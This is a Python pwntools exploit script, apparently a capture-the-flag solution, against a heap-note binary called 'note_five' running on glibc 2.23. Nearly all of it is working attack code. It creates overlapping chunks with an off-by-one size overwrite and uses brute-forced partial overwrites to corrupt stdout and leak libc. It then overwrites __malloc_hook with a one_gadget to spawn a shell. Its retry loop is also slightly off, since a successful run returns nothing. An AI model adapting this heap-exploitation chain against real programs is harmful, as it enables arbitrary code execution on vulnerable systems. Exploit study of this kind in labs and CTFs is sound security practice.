from pwn import *
import sys, os
context.log_level = 'debug'
prog = './note_five'
elf = ELF(prog)

libc = ELF("./libc-2.23.so")
#p = remote("")
def dbg():
    gdb.attach(p)
    p.interactive()

def add(idx, size):
	p.sendlineafter(">> ", '1')
	p.sendlineafter("idx: ", str(idx))
	p.sendlineafter("size: ", str(size))
def edit(idx, content):
	p.sendlineafter(">> ", '2')
	p.sendlineafter("idx: ", str(idx))
	p.sendafter("content: ", content)
def free(idx):
	p.sendlineafter(">> ", '3')
	p.sendlineafter("idx: ", str(idx))
def exp():
	global p
	p = process(prog)		
	add(0, 0x98)	
	add(1, 0x98)
	add(2, 0x98)
	add(3, 0x98)
	free(0)
	edit(1, 'a'*0x90+p64(0x140)+p8(0xa0))
	free(2)
	add(0, 0xe8)
	edit(1, 'a'*0x40+p64(0)+p64(0xf1)+p64(0)+p16(0x57e8)+'\n')	
	add(4, 0xe8)
	try:	
		free(4)
		edit(1, 'a'*0x40+p64(0)+p64(0xf1)+p16(0x45cf)+'\n')
	except:
		log.failure("not lucky enough!")
		p.close()
		return False
		
	add(4, 0xe8)
	add(0, 0xe8)
	edit(0, 'a'*0x41 + p64(0xfbad1800)+p64(0)*3+'\x00'+'\n')
	libc_base=u64(p.recvuntil('\x7f')[-6:].ljust(8,'\x00'))-0x3c5600	
	log.success("libc_base :" + hex(libc_base))
	malloc_hook = libc.sym['__malloc_hook'] + libc_base 
	realloc = libc.sym['__libc_realloc'] + libc_base 	
	stdin = libc.sym['_IO_2_1_stdin_'] + libc_base	
	one = 0x4526a + libc_base
	free(4)	
	edit(1, 'a'*0x40+p64(0)+p64(0xf1)+p64(stdin + 143)+'\n')
	add(4, 0xe8)
	add(0, 0xe8)
	edit(0,'a'*0xe0+p8(0xff)+'\n')
	free(4)
	edit(1, 'a'*0x40+p64(0)+p64(0xf1)+p64(stdin + 375)+'\n')	
	add(4, 0xe8)
	add(0, 0xe8)
	edit(0, '\x00'*0xa1 + p64(one)+p64(realloc+13)+'\n')

	p.interactive()
while not exp():
	pass

if __name__ == '__main__':
	exp()
